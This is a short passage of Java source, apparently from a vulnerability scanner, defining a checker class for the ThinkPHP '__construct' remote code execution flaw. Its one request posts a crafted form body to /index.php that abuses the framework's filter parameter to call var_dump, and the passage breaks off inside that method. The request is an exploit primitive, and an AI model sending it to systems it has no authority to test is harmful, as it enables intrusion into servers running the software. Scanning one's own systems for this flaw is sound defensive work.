...
public class thinkphp_construct_debug_rce implements BasePayload {
    private static final String CheckStr="11111";

    public boolean checkVUL(String url) throws Exception{

        try {
            String test_result = HttpTool.postHttpRequest(url + "/index.php", "utf-8","application/x-www-form-urlencoded","_method=__construct&filter%5B%5D=var_dump&server%5BREQUEST_METHOD%5D="+CheckStr);
